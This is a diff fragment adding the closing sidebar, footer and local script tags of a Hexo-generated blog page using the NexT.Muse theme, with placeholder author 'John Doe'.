+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
